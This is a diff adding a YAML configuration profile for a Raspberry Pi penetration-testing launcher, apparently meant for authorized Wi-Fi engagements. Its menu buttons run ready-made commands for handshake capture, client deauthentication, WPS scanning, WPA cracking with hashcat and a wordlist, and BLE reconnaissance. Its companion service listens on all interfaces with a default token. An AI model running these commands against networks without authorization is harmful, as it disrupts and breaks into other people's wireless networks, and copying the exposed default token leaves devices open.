@@ -1,0 +1,74 @@
+# RaspyJack-X — WIRELESS profile (focused loadout)
+title: "Strikeback X · WiFi"
+require_consent: true
+engagement: "wifi"
+log_dir: "~/loot"
+scope:
+  - "192.168.0.0/16"
+  - "10.0.0.0/8"
+companion: {enable: true, bind: "0.0.0.0", port: 8088, token: "change-me"}
+notify: {ntfy_server: "https://ntfy.sh", topic: "", public_url: "", priority: "default"}
+variables:
+  iface: "eth0"
+  wlan: "wlan1"
+  mon: "wlan1"
+  bssid: "AA:BB:CC:DD:EE:FF"
+  channel: "6"
+  wordlist: "/usr/share/wordlists/rockyou.txt"
+  outdir: "/home/pi/loot/wifi"
+
+categories:
+  - name: "Wireless"
+    icon: "✶"
+    tools:
+      - label: "Scan APs"
+        cmd: "nmcli -f SSID,CHAN,SIGNAL,SECURITY dev wifi list ifname {wlan}"
+      - label: "Monitor ON"
+        cmd: "sudo rjx-mon {wlan} on"
+        confirm: true
+      - label: "Monitor OFF"
+        cmd: "sudo rjx-mon {wlan} off"
+      - label: "Survey (airodump 30s)"
+        cmd: "timeout 30 airodump-ng --band abg -w {outdir}/survey --output-format csv {mon}"
+        shell: true
+        confirm: true
+
+  - name: "WiFi-Atk"
+    icon: "ᚲ"
+    tools:
+      - label: "Handshake/PMKID (hcxdumptool)"
+        cmd: "sudo timeout 90 hcxdumptool -i {mon} -w {outdir}/capture.pcapng"
+        confirm: true
+      - label: "Deauth clients"
+        cmd: "sudo aireplay-ng --deauth 10 -a {bssid} {mon}"
+        confirm: true
+      - label: "WPS scan (wash)"
+        cmd: "sudo wash -i {mon}"
+        confirm: true
+      - label: "Convert → 22000"
+        cmd: "hcxpcapngtool -o {outdir}/wifi.22000 {outdir}/capture.pcapng"
+      - label: "Crack WPA (hashcat)"
+        cmd: "hashcat -m 22000 {outdir}/wifi.22000 {wordlist} --quiet"
+        confirm: true
+
+  - name: "Bluetooth"
+    icon: "ᛒ"
+    tools:
+      - label: "Scan BLE (10s)"
+        cmd: "timeout 10 bluetoothctl scan on"
+        shell: true
+      - label: "BLE recon (bettercap)"
+        cmd: "sudo bettercap -eval 'ble.recon on; sleep 15; ble.show; q'"
+        confirm: true
+
+  - name: "System"
+    icon: "ᛟ"
+    tools:
+      - label: "Temps (Pi 5)"
+        cmd: "vcgencmd measure_temp; vcgencmd get_throttled"
+        shell: true
+      - label: "USB devices"
+        cmd: "lsusb"
+      - label: "Reboot"
+        cmd: "sudo reboot"
+        confirm: true
